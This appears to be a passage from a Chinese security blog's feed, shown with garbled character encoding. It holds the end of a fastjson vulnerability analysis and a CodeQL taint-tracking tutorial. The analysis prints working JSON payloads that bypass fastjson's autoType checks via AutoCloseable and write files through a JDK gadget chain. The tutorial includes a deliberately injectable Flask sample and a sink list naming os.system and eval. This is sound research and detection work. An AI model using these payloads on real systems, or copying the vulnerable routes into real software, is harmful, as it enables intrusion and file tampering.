</p><p>è¿™é‡Œç¨å¾®è·Ÿäº†ä¸‹ç¨‹åº, å‘ç° expectClass çš„ä½œç”¨å…¶å®ç›¸å½“äºä¸€ä¸ªä¸´æ—¶ç™½åå•, è¿™é‡Œæœ‰ä¸¤ä¸ªç‰¹æ€§:  </p><ol><li>æ¯”å¦‚æœ‰ä¸ª  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Face</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">implements</span> <span class="title">Face</span> </span>&#123;</span><br><span class="line">    String aaa;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAaa</span><span class="params">(String aaa)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.aaa = aaa;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    Face test;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTest</span><span class="params">(Face test)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.test = test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>é‚£ä¹ˆé€šè¿‡ <code>JSON.parseObject(&quot;{\&quot;test\&quot;:{\&quot;@type\&quot;: \&quot;Test\&quot;, \&quot;aaa\&quot;: \&quot;zz\&quot;}}&quot;, Test2.class);</code> æ˜¯å¯ä»¥ååºåˆ—åŒ–çš„, fastjson ä¼šå¯¹å½“å‰ååºåˆ—åŒ–ç±»çš„ field çš„ç±»å‹ä½œä¸º type ä¼ è¿› <code>JavaBeanDeserializer.deserialze</code>. æœ€åæˆä¸º expectClass ä»£å…¥ checkAutoType ä¸­, å¦‚æœ @type æŒ‡å®šçš„ç±»æ˜¯ expectClass çš„å­ç±», å°±å¯ä»¥åœ¨é»‘åå•ä¸ç¦æ­¢çš„æƒ…å†µä¸‹é€šè¿‡æ£€æŸ¥, è¿™æ ·å°±å¯ä»¥ä¸º interface åˆ¶å®šç±».  </p><ol start="2"><li>è¿˜æœ‰ä¸€ä¸ªç‰¹æ€§, é‚£å°±æ˜¯ä¼šç›´æ¥ä¸º field åˆ›å»º JavaBeanDeserializer, è¿™ä¸ªæ›´å¼ºä¸€äº›, æ— è§†é»‘åå•ä»¥åŠç™½åå•, ä½†æ˜¯å‰ææœ‰ä¸€ä¸ªç±»çš„ field (æˆ–è€… setter) ä½¿ç”¨äº†æ‰è¡Œ. æ¯”å¦‚:  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    java.lang.Thread test;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTest</span><span class="params">(java.lang.Thread test)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.test = test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><code>JSON.parseObject(&quot;{\&quot;test\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Thread\&quot;}}&quot;, Test2.class);</code> ä¼šç›´æ¥å°† Thread ååºåˆ—åŒ–, æ— è§†äº†é»‘åå• (å®é™…ä¸Šç›´æ¥ç»•è¿‡äº† checkAutoType, SafeMode ä¸‹ä¾ç„¶å¯ä»¥ååºåˆ—åŒ–), ä½†è¿™ä¸ªæ˜æ˜¾é¸¡è‚‹å¾ˆå¤š, æ¯•ç«Ÿé‚£äº›å±é™©ç±»ä¸€èˆ¬æƒ…å†µä¸‹éƒ½æ˜¯æ²¡ç”¨çš„. æ²¡äººä¼šä½œä¸º filed æ¥ä½¿ç”¨.  </li></ol><p>è¿™æ¬¡æ¼æ´ä¹Ÿæ˜¯å› ä¸ºç‰¹æ€§ 1 çš„åŸå› . ä½†è¿˜æœ‰ä¸€ä¸ªåŸå› æ‰èƒ½å¯¼è‡´æ¼æ´, é‚£å°±æ˜¯ AutoCloseable æ˜¯åœ¨å†…ç½®çš„ååºåˆ—åŒ– classMappings ä¸­çš„, æ²¡é”™, å°±æ˜¯ä¹‹å‰ç¼“å­˜ç»•è¿‡ autoType çš„é‚£ä¸ª mapping. æ‰€ä»¥å¯¼è‡´äº† AutoCloseable æ˜¯èƒ½ç›´æ¥è¢«ååºåˆ—åŒ–çš„, è¿™é‡Œå¯ä»¥æ ¹æ®ç‰¹æ€§ä¸€, æ„é€ </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"@type"</span>: <span class="string">"java.lang.AutoCloseable"</span>,</span><br><span class="line">    <span class="attr">"@type"</span>: <span class="string">"java.io.FileOutputStream"</span>,</span><br><span class="line">    <span class="attr">"file"</span>: <span class="string">"/tmp/asdasd"</span>,</span><br><span class="line">    <span class="attr">"append"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å¯ä»¥ç›´æ¥ç»•è¿‡ autoType çš„æ£€æŸ¥, å¾—åˆ° java.io.FileOutputStream, æ­¤å¤„æ˜¯ç›´æ¥ç”¨ <code>&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;</code> æ„é€ å‡ºäº† JavaBeanDeserializer, è€Œä¸æ˜¯è·Ÿä¸Šé¢çš„ä¾‹å­ä¸€æ ·é€šè¿‡ filed çš„æ–¹å¼. ç›¸ä¿¡çœ‹åˆ°è¿™é‡Œ, å°±å·²ç»æœ‰æƒ³æ³•äº†, å¯ä»¥é€šè¿‡ AutoCloseable çš„å­ç±»æ¥å®Œæˆç›¸å…³çš„æ”»å‡».  </p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>ä¿®å¤æ–¹å¼ä»ä¸Šé¢çš„ diff ä¸­å¯ä»¥çœ‹å‡ºæ˜¯åœ¨åŸæ¥çš„åŸºç¡€ä¸ŠåŠ äº†å‡ ä¸ª, å®é™…ä¸Šå¯ä»¥çœ‹åˆ°åŸæ¥æœ¬èº«å°±æ˜¯æœ‰é˜²å¾¡çš„, å› ä¸ºæœ‰äº›å†…ç½®ç±»æ˜¯ä»¥ Object ä½œä¸º setter, æ„é€ å‡½æ•°çš„å‚æ•°ç±»å‹çš„, å¦‚æœä¸ ban æ‰, å°±å¯ä»¥ç›´æ¥ååºåˆ—åŒ–ä»»æ„ç±»äº†. è¿™æ¬¡çš„æ¼æ´æ›´åƒæ˜¯æŸç§æ„ä¹‰ä¸Šçš„é»‘åå•è¢«ç»•è¿‡, ä¸è¿‡å¯ä»¥çœ‹åˆ° AutoCloseable æ˜¯ Closeble çš„çˆ¶ç±», ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šåœ¨ Closeble å·²ç»è¢« ban æ‰çš„æƒ…å†µä¸‹å¿˜è®°æ·»åŠ  AutoCloseable, å¯èƒ½æ˜¯å¿˜è®°äº†? 233</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>è¿™é‡Œåˆ†äº«ä¸€æ¡æˆ‘æ‰¾åˆ°çš„ä¸éœ€è¦ä¸‰æ–¹åº“çš„é“¾, æ³¨æ„è™½ç„¶ä¸éœ€è¦ä¸‰æ–¹åº“, ä½†åªèƒ½åœ¨ openjdk &gt;= 11 ä¸‹åˆ©ç”¨, å› ä¸ºåªæœ‰è¿™äº›ç‰ˆæœ¬æ²¡å»æ‰ç¬¦å·ä¿¡æ¯. fastjson åœ¨ç±»æ²¡æœ‰æ— å‚æ•°æ„é€ å‡½æ•°æ—¶, å¦‚æœå…¶ä»–æ„é€ å‡½æ•°æ˜¯æœ‰ç¬¦å·ä¿¡æ¯çš„è¯ä¹Ÿæ˜¯å¯ä»¥è°ƒç”¨çš„, æ‰€ä»¥å¯ä»¥å¤šåˆ©ç”¨ä¸€äº›å†…éƒ¨ç±», ä½†æ˜¯ openjdk 8, åŒ…æ‹¬ oracle jdk éƒ½æ˜¯ä¸å¸¦è¿™äº›ä¿¡æ¯çš„, å¯¼è‡´æ— æ³•ååºåˆ—åŒ–, è‡ªç„¶ä¹Ÿå°±æ— æ³•åˆ©ç”¨. æ‰€ä»¥ç›¸å¯¹æ¯”è¾ƒé¸¡è‚‹, ä»…ä¾›å­¦ä¹ . orz  </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"@type"</span>: <span class="string">"java.lang.AutoCloseable"</span>,</span><br><span class="line">    <span class="attr">"@type"</span>: <span class="string">"sun.rmi.server.MarshalOutputStream"</span>,</span><br><span class="line">    <span class="attr">"out"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"java.util.zip.InflaterOutputStream"</span>,</span><br><span class="line">        <span class="attr">"out"</span>: &#123;</span><br><span class="line">           <span class="attr">"@type"</span>: <span class="string">"java.io.FileOutputStream"</span>,</span><br><span class="line">           <span class="attr">"file"</span>: <span class="string">"/tmp/asdasd"</span>,</span><br><span class="line">           <span class="attr">"append"</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"infl"</span>: &#123;</span><br><span class="line">           <span class="attr">"input"</span>: &#123;</span><br><span class="line">               <span class="attr">"array"</span>: <span class="string">"eJxLLE5JTCkGAAh5AnE="</span>,</span><br><span class="line">               <span class="attr">"limit"</span>: <span class="number">14</span></span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"bufLen"</span>: <span class="string">"100"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"protocolVersion"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§è‡´æ€è·¯æ˜¯ä»ä¸Šé¢å·²ç»å†™å‡ºæ¥çš„ FileOutputStream å¼€å§‹, æ‰¾åˆ°ä¸€ä¸ªèƒ½å¾€é‡Œé¢æŒ‡å®šå†™å…¥å†…å®¹çš„ç±», è¿™é‡Œè¦ä¸€æ¬¡ä¼ å…¥ä¸¤ä¸ªå‚æ•°, æ‰€ä»¥åªèƒ½é€šè¿‡æ„é€ å‡½æ•°æˆ–è€…ä¸¤ä¸ª setter æ¥è®¾ç½®, æ¯”è¾ƒå°´å°¬çš„æ˜¯æ²¡æœ‰æ‰¾åˆ°å¯ä»¥ç›´æ¥è§¦å‘çš„, è¿˜éœ€è¦å†è°ƒç”¨ä¸€æ¬¡ write/close/flush æ‰èƒ½çœŸæ­£å†™å…¥å†…å®¹, æœ€ååˆæ‰¾åˆ°äº† <code>sun.rmi.server.MarshalOutputStream</code>, å¯ä»¥å†™å…¥ä¸å¯æ§å†…å®¹, æ‰çœŸæ­£å®Œæˆ exp.  </p><p>è¿™é‡Œå¯ä»¥é€šè¿‡åå°„æ¥æš´åŠ›æœç´¢å‡½æ•°ç›¸å…³å‚æ•°, åŠ å¿«æœç´¢è¿‡ç¨‹, ä½†ä¹Ÿæ˜¯å¾ˆéº»çƒ¦çš„ orz</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä»¥æ­¤ç¥­å¥ æ‰¾ gadgets é€å»çš„é’æ˜¥, orz&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="java" scheme="https://rmb122.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Codeql è¸©å‘è®°å½• (äºŒ)</title>
    <link href="https://rmb122.com/2020/03/31/Codeql-%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-%E4%BA%8C/"/>
    <id>https://rmb122.com/2020/03/31/Codeql-%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-%E4%BA%8C/</id>
    <published>2020-03-31T15:06:52.000Z</published>
    <updated>2020-05-29T10:52:52.200Z</updated>
    
    <content type="html"><![CDATA[<p>é¦–å…ˆéœ€è¦è§£å†³çš„å°±æ˜¯ä¸Šæ¬¡ç•™ä¸‹çš„é—®é¢˜, æ·»åŠ è‡ªå®šä¹‰çš„ taint track.<br>åœ¨è‡ªå¸¦çš„ tests ä¸­å°±æœ‰ç¤ºä¾‹, å¯ä»¥å‚è€ƒ <code>ql/python/ql/test/library-tests/taint/extensions/ExtensionsLib.qll</code>  </p><a id="more"></a><p>æœ€åå¤§æ¦‚æ˜¯è¿™æ ·  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class AnyCallFlow extends DataFlowExtension::DataFlowNode &#123;</span><br><span class="line">     AnyCallFlow() &#123;</span><br><span class="line">         exists(CallNode call |</span><br><span class="line">            call.getFunction().(AttrNode).getObject() &#x3D; this</span><br><span class="line">         )</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     override ControlFlowNode getASuccessorNode() &#123;</span><br><span class="line">         result.(CallNode).getFunction().(AttrNode).getObject() &#x3D; this</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„æ€å°±æ˜¯å¦‚æœä¸€ä¸ª funccall ä¸­æ˜¯ val.attr ç±»å‹çš„, ä¸” val è¢« taint äº†, é‚£ä¹ˆæ•´ä¸ª CallNode éƒ½å°†è¢« taint.<br>ç„¶ååŠ åˆ° Configuration é‡Œé¢å°±å¯ä»¥äº†  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isExtension(TaintTracking::Extension extension) &#123;</span><br><span class="line">    extension instanceof AnyCallFlow</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å°±èƒ½å¤Ÿè¯†åˆ« split ç­‰æ–¹æ³•äº†, ä¸è¿‡è¿™æ ·çš„ç»“æœè‚¯å®šæ˜¯å¢åŠ è¯¯æŠ¥ç‡äº†.<br>è¿™é‡Œæ’ä¸€å¥, æœ€è¿‘åœ¨çœ‹å—å¤§å¼€åœ¨ B ç«™ä¸Šçš„è½¯ä»¶åˆ†æè¯¾ç¨‹, è®²çš„æŒºå¥½, è¿™é‡Œå…¶å®å°±æ˜¯ soundness completeness é—®é¢˜, åœ¨å®‰å…¨è¿™ä¸€å—è¿˜æ˜¯ soundness å¥½ä¸€ç‚¹, æ‰€ä»¥æœ€å¥½è¿˜æ˜¯ç‰ºç‰²è™šè­¦ç‡æ¥æé«˜æ¼æŠ¥ç‡å§.  </p><p>æœ€åæŒ‰ç…§å®˜æ–¹åº“çš„æ–¹æ³•, å°è£…ä¸€ä¸‹, æœ€åçš„ç»“æœ  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import python</span><br><span class="line">import semmle.python.security.TaintTracking</span><br><span class="line">import semmle.python.web.flask.Request</span><br><span class="line"></span><br><span class="line">class AnyCallFlow extends DataFlowExtension::DataFlowNode &#123;</span><br><span class="line">     AnyCallFlow() &#123;</span><br><span class="line">         exists(CallNode call |</span><br><span class="line">            call.getFunction().(AttrNode).getObject() &#x3D; this</span><br><span class="line">         )</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     override ControlFlowNode getASuccessorNode() &#123;</span><br><span class="line">         result.(CallNode).getFunction().(AttrNode).getObject() &#x3D; this</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DangerousFunctionArg0 extends Value &#123;</span><br><span class="line">    DangerousFunctionArg0() &#123;</span><br><span class="line">        exists(Value val |</span><br><span class="line">            this &#x3D; val and</span><br><span class="line">            (</span><br><span class="line">                val &#x3D; Value::named(&quot;subprocess.check_output&quot;) or</span><br><span class="line">                val &#x3D; Value::named(&quot;os.system&quot;) or </span><br><span class="line">                val &#x3D; Value::named(&quot;os.popen&quot;) or </span><br><span class="line">                val &#x3D; Value::named(&quot;eval&quot;) or </span><br><span class="line">                val &#x3D; Value::named(&quot;exec&quot;) or</span><br><span class="line">                val &#x3D; Value::named(&quot;flask.render_template_string&quot;)</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DangerousFunctionArg0Sink extends TaintSink &#123;</span><br><span class="line">    DangerousFunctionArg0Sink() &#123;</span><br><span class="line">        exists(</span><br><span class="line">            CallNode call, DangerousFunctionArg0 dangerous_func |</span><br><span class="line">            call.getFunction().pointsTo(dangerous_func) and</span><br><span class="line">            call.getArg(0) &#x3D; this</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate sinks(TaintKind taint) &#123;</span><br><span class="line">        any()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class SystemCommandExecution extends TaintTracking::Configuration &#123;</span><br><span class="line">    SystemCommandExecution() &#123; this &#x3D; &quot;SystemCommandExecution Tracking&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node src, TaintKind kind) &#123;</span><br><span class="line">        src.asCfgNode() instanceof FlaskRequestArgs</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink, TaintKind kind) &#123;</span><br><span class="line">        sink.asCfgNode() instanceof DangerousFunctionArg0Sink</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isExtension(TaintTracking::Extension extension) &#123;</span><br><span class="line">         extension instanceof AnyCallFlow</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from SystemCommandExecution config, DataFlow::Node src, DataFlow::Node sink</span><br><span class="line">where config.hasSimpleFlow(src, sink)</span><br><span class="line">select sink, src</span><br></pre></td></tr></table></figure><p>æ£€æµ‹ä»¥ä¸‹ sample, ä¸€å…± 10 ä¸ªæ¼æ´, éƒ½èƒ½æ‰¾åˆ°, è¿˜æ˜¯ä¸é”™çš„  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passby</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> i.split(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index2')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index2</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index3')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index3</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index4')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index4</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index5')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index5</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index6')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index6</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index7')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index7</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index8')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index8</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index9')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index9</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(<span class="string">"asd"</span>, t=tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index10')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index10</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = passby(tmp + <span class="string">"i"</span>)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(<span class="string">"asd"</span>, t=tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index11')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index11</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = passby(tmp + <span class="string">"i"</span>)</span><br><span class="line">    <span class="keyword">return</span> eval(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index12')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index12</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = passby(tmp + <span class="string">"i"</span>)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(tmp)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p>æœ€å, å…¶å®æ„Ÿè§‰ç¼–å†™æœ€å¤§çš„éš¾ç‚¹è¿˜æ˜¯éœ€è¦æ€ç»´çš„è½¬æ¢, è¿™ç§å£°æ˜å¼çš„è¯­è¨€åƒ SQL ä¸€æ ·, æ˜¯å‘Šè¯‰ç¨‹åº, å¸Œæœ›åœ¨ xx åœ°æ–¹æ˜¯ xx, ä¸” xx é‡Œé¢çš„ yy æ˜¯ zz è¿™æ ·.<br>éœ€è¦ä¸€ç‚¹æ—¶é—´æ¥è½¬å˜æ€ç»´å§, ä¹‹åæ˜¯è¿™ä¸ªå®˜æ–¹ python æ¥å£åº“æ„Ÿè§‰æœ¬èº«å†™çš„å°±æœ‰ç‚¹ä¹± (é€ƒ, å„ç§ç±»ä¼¼çš„å¯¹è±¡, åˆæ˜¯ PythonFunctionCall, CallNode çš„, åŒæ 